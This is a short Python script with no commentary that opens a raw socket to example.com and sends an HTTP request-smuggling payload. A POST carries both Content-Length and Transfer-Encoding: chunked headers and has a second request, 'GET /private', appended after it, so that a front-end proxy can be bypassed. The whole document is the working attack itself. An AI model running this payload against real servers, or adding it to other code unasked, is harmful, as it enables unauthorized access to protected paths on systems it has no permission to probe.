import socket

headers = "Content-Length: 4\r\nTransfer-Encoding: chunked"
first = "POST / HTTP/1.1\r\nHost: target\r\n"
second = "GET /private HTTP/1.1\r\nHost: target\r\n\r\n"
client = socket.create_connection(("example.com", 80))
client.sendall((first + headers + "\r\n\r\n0\r\n\r\n" + second).encode())
